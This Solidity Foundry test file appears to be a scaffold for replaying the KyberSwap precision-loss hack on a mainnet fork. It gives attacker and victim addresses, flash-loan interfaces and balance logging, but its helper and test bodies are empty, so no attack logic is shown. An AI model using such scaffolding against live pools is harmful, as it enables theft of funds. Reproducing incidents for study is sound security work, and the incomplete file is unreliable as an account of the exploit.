// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~$46M
// Attacker EOA: https://etherscan.io/address/0x50275e0b7261559ce1644014d4b78d4aa63be836
// Attacker Contracts : https://etherscan.io/address/0xaf2acf3d4ab78e4c702256d214a3189a874cdc13
// Vulnerable Contract : https://etherscan.io/address/0xFd7B111AA83b9b6F547E617C7601EfD997F64703
// Transaction : https://phalcon.blocksec.com/explorer/tx/eth/0x485e08dc2b6a4b3aeadcb89c3d18a37666dc7d9424961a2091d6b3696792f0f3 (block 18630392)

// @Analysis
// https://phalcon.blocksec.com/explorer/security-incidents
// https://twitter.com/BlockSecTeam/status/1727560157888942331
// https://blocksec.com/blog/yet-another-tragedy-of-precision-loss-an-in-depth-analysis-of-the-kyber-swap-incident-1
// https://blog.solidityscan.com/kyberswap-hack-analysis-25e25f2e4a7b
// https://slowmist.medium.com/a-deep-dive-into-the-kyberswap-hack-3e13f3305d3a

interface IPoolStorage {
    function token0() external view returns (IERC20);

    function token1() external view returns (IERC20);

    function swapFeeUnits() external view returns (uint24);

    function tickDistance() external view returns (int24);

    function getPositions(address owner, int24 tickLower, int24 tickUpper) external view returns (uint128 liquidity, uint256 feeGrowthInsideLast);

    function getPoolState() external view returns (uint160 sqrtP, int24 currentTick, int24 nearestCurrentTick, bool locked);

    function getLiquidityState() external view returns (uint128 baseL, uint128 reinvestL, uint128 reinvestLLast);
}

interface IPoolActions {
    function swap(address recipient, int256 swapQty, bool isToken0, uint160 limitSqrtP, bytes memory data) external returns (int256 qty0, int256 qty1);
}

interface IPoolKyberswap is IPoolActions, IPoolStorage {}

interface IPoolAave {
    function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes memory params, uint16 referralCode) external;
}

contract Logger is Test {
    function logTag(string memory stage, string memory token, string memory label) public returns (string memory) {
        string memory text_stage = string(abi.encodePacked(" [ ", stage, " ] "));
        string memory text_token = string(abi.encodePacked(" [ ", token, " ] "));
        string memory text_label = string(abi.encodePacked(" [ ", label, " ] "));
        return string(abi.encodePacked(text_stage, text_token, text_label));
    }

    function logBalances(string memory stage_label, string memory token_label, string memory target_label, address target, address token) public {
        emit log_named_decimal_uint(logTag(stage_label, token_label, target_label), IERC20(token).balanceOf(target), IERC20(token).decimals());
    }
}

contract HelperContract {
    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes memory params) external returns (bool) {
        // approve
    }
}

contract KyberswapExploit is Logger {
    string private constant chain = "mainnet";
    uint256 private constant block = 18_630_391;
    address private constant victim = address(0xFd7B111AA83b9b6F547E617C7601EfD997F64703);
    address private constant lender = address(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    uint256 private constant amount = 0x6c6b935b8bbd400000; // 2,000,000,000,000,000,000,000
    address private attacker = address(this);
    address private helper = address(0);
    address private token0 = address(0);
    address private token1 = address(0);

    function setUp() public {
        vm.createSelectFork(chain, block);
        token0 = address(IPoolKyberswap(victim).token0());
        token1 = address(IPoolKyberswap(victim).token1());
        helper = address(new HelperContract());
        vm.label(victim, "KS2-RT");
        vm.label(lender, "Aave: Pool V3");
        vm.label(token0, "frxETH");
        vm.label(token1, "WETH");
    }

    function testExploit() public {
        // create the exploit contract

        // fund the attacker
        deal(address(token0), attacker, 200e18);

        // log pre-exploit
        logBalances("before", "token0", "victim", victim, token0);
        logBalances("before", "token1", "victim", victim, token1);
        logBalances("before", "token0", "attacker", attacker, token0);
        logBalances("before", "token1", "attacker", attacker, token1);

        // log post-exploit
        logBalances("after", "token0", "victim", victim, token0);
        logBalances("after", "token1", "victim", victim, token1);
        logBalances("after", "token0", "attacker", attacker, token0);
        logBalances("after", "token1", "attacker", attacker, token1);
    }
}
